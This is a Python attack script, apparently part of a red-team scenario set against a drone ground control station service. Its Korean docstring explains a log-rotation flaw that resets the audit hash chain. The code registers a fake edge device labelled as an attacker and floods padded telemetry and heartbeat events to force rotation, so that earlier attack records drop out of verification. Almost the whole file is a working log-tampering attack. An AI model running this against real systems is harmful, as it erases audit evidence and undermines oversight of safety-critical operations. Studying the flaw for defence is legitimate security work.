"""
Audit Log Hash Chain Disconnection — 감사 로그 체인 단절 공격
독창 시나리오 #14 | IEEE S&P 2024 "Audit Trail Manipulation in Safety-Critical Systems"

GCS 취약점 (log_store.py):
  def _rotate_if_needed(self) -> None:
      if self.current_path.stat().st_size < self.max_bytes:  # 20MB
          return
      archive = self.root_dir / f"audit-{stamp}.jsonl"
      self.current_path.rename(archive)
      self._last_hash = None   # ← 로테이션 시 체인 완전 리셋!

공격 전략:
  대량 이벤트를 빠르게 주입하여 audit.jsonl → 20MB 달성 → 강제 로테이션
  → 이전 공격 흔적이 아카이브 파일에 분리
  → 새 audit.jsonl의 previous_hash=None → 연속성 증명 불가
  → /api/logs/verify → { "valid": true } (새 파일만 검증, 공격 로그 검증 안 됨)

주입 이벤트 유형 (각각 ~2KB):
  - /api/telemetry/ingest (텔레메트리 대량)
  - /api/edge/devices/heartbeat (heartbeat 대량)
  - /api/commands/request (커맨드 요청)
  → 20MB ≈ 10,000건 주입으로 달성
"""
from __future__ import annotations

import argparse
import random
import time
from .common import GcsClient, wait_for_gcs

FLOOD_ASSETS = ["small-dronebot-01", "ground-convoy-01"]
FLOOD_EDGE_ID = "edge-audit-flood-01"


def _get_log_info(client: GcsClient) -> dict:
    try:
        resp = client.get("/api/logs/status")
        return resp.get("payload", resp)
    except Exception:
        return {}


def _telemetry_burst(client: GcsClient, asset_id: str, tick: int) -> bool:
    """텔레메트리 1건 주입 → 감사 로그에 이벤트 기록"""
    try:
        client.post("/api/telemetry/ingest", {
            "asset_id":         asset_id,
            "time_s":           tick % 420,
            "position":         [200.0 + random.gauss(0, 2), -220.0 + random.gauss(0, 2), 95.0],
            "velocity_mps":     [random.uniform(10, 15), random.uniform(-2, 2), 0.0],
            "heading_deg":      (tick * 7) % 360,
            "status":           "edge-live",
            "source":           "AUDIT-FLOOD",
            "source_id":        FLOOD_EDGE_ID,
            "source_type":      "uav_edge",
            "source_authority": "EXTERNAL-ATTACKER",
            "track_confidence": 0.75,
            "link_profile":     "rf_flood",
            "battery_wh":       690.0,
            "padding":          "X" * 1200,  # 이벤트 크기 ~2KB로 확대
        })
        return True
    except Exception:
        return False


def _heartbeat_burst(client: GcsClient, tick: int) -> bool:
    """heartbeat 1건 주입 → 감사 로그에 이벤트 기록"""
    try:
        client.post("/api/edge/devices/heartbeat", {
            "edge_id":      FLOOD_EDGE_ID,
            "link_quality": round(random.uniform(0.7, 0.9), 3),
            "cpu_load":     round(random.uniform(0.3, 0.6), 3),
            "temperature_c": round(random.uniform(45, 60), 1),
            "uptime_s":     tick * 2,
        })
        return True
    except Exception:
        return False


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Audit Log Hash Chain Disconnection 공격")
    parser.add_argument("--service-url",     default="http://dah-gcs:8080")
    parser.add_argument("--target-events",   type=int, default=8000,
                        help="주입 목표 이벤트 수 (20MB = ~10,000건)")
    parser.add_argument("--burst-size",      type=int, default=50,
                        help="버스트당 이벤트 수")
    parser.add_argument("--burst-interval-s", type=float, default=0.5,
                        help="버스트 간격 (s)")
    parser.add_argument("--duration-s",      type=float, default=120.0)
    args = parser.parse_args(argv)

    client = GcsClient(args.service_url)

    # 엣지 등록
    try:
        client.post("/api/edge/devices/register", {
            "edge_id":          FLOOD_EDGE_ID,
            "device_type":      "uav_edge",
            "asset_ids":        FLOOD_ASSETS,
            "authority":        "EXTERNAL-ATTACKER",
            "link_profiles":    ["rf_flood"],
            "software_version": "audit-flood-0.1",
        })
    except Exception:
        pass

    wait_for_gcs(client)

    print(
        f"[audit_flood] Audit Hash Chain Disconnection 시작\n"
        f"  목표 이벤트: {args.target_events}건\n"
        f"  버스트 크기: {args.burst_size}건\n"
        f"  원리: log_store.py _rotate_if_needed() → 20MB 초과 시 _last_hash=None\n"
        f"  결과: /api/logs/verify는 새 파일만 검증 → 공격 로그 검증 불가",
        flush=True,
    )

    log_before = _get_log_info(client)
    print(f"[audit_flood] 공격 전 로그 상태: {log_before}", flush=True)

    start = time.time()
    tick = 0
    total_injected = 0

    while (time.time() - start) < args.duration_s and total_injected < args.target_events:
        burst_ok = 0
        for _ in range(args.burst_size):
            asset = FLOOD_ASSETS[tick % len(FLOOD_ASSETS)]
            if tick % 3 == 0:
                ok = _telemetry_burst(client, asset, tick)
            else:
                ok = _heartbeat_burst(client, tick)
            if ok:
                burst_ok += 1
            tick += 1

        total_injected += burst_ok

        if total_injected % 500 < args.burst_size:
            log_now = _get_log_info(client)
            print(
                f"[audit_flood] {total_injected}건 주입 | 경과={time.time()-start:.0f}s | "
                f"로그={log_now}",
                flush=True,
            )

        time.sleep(args.burst_interval_s)

    log_after = _get_log_info(client)
    print(
        f"\n[audit_flood] ★ 공격 완료\n"
        f"  총 주입: {total_injected}건\n"
        f"  공격 후 로그 상태: {log_after}\n"
        f"  검증: curl http://localhost:8080/api/logs/verify → valid=true 이면 공격 성공",
        flush=True,
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
